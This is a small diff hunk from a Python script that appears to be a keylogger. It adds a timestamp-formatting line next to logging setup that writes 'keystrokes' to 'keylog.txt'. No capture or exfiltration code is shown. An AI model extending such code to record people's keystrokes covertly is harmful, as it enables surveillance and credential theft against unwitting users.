@@ -7,6 +7,7 @@ import os
 
 # Setting up date time
 time = datetime.datetime.now()
+time = time.strftime('%Y-%m-%d %H:%M:%S')
 # Set up logging for storing keystrokes
 logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(message)s")
 
